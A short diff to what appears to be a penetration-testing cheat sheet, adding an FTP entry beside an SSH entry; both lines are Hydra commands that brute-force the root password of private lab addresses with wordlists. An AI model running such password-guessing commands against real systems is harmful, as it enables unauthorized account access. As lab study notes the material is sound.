@@ -17,3 +17,7 @@
 
 ##### SSH 
 `hydra -l root -P /home/kali/tools/pass.txt 192.168.57.131 ssh -t 4`
+
+##### FTP
+`hydra -t 3 -V -ensr -l root -P /usr/share/wordlists/john.lst 192.168.57.132 ftp`
+
